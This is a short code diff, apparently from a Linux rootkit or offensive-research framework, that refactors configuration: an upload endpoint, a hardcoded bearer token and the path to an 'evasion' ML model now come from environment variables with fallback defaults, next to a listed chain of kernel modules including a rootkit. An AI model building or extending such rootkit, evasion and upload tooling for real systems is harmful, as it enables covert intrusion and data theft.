@@ -26,12 +26,37 @@ const LKM_CHAIN = [
     ("rootkit_compat.ko", "Compatibility rootkit for older kernels"),
 ]
 
-// Configuration
-const CDN_ENDPOINT = "https://10.0.2.2:8443/upload"
-const CDN_AUTH_TOKEN = "Bearer research_caddy_auth_token_v2_linux_2024"
+// Configuration - Read from environment with fallback defaults
+const CDN_ENDPOINT = jocky_getenv("JOCKY_CDN_ENDPOINT")
+const CDN_AUTH_TOKEN = jocky_getenv("JOCKY_CDN_TOKEN")
 
-const ML_MODEL_PATH = "/opt/models/phi3_evasion_linux.gguf"
+const ML_MODEL_PATH = jocky_getenv("JOCKY_MODEL_PATH")
 const MAX_INFERENCE_TIME_MS = 100
+
+// Fallback defaults if env vars not set
+fn get_cdn_endpoint() -> str {
+    let ep = jocky_getenv("JOCKY_CDN_ENDPOINT")
+    if ep == "" {
+        return "https://10.0.2.2:8443/upload"
+    }
+    return ep
+}
+
+fn get_cdn_token() -> str {
+    let tk = jocky_getenv("JOCKY_CDN_TOKEN")
+    if tk == "" {
+        return "Bearer research_caddy_auth_token_v2_linux_2024"
+    }
+    return tk
+}
+
+fn get_model_path() -> str {
+    let mp = jocky_getenv("JOCKY_MODEL_PATH")
+    if mp == "" {
+        return "/opt/models/phi3_evasion_linux.gguf"
+    }
+    return mp
+}
 
 // Global state
 var audit_log_initialized = false
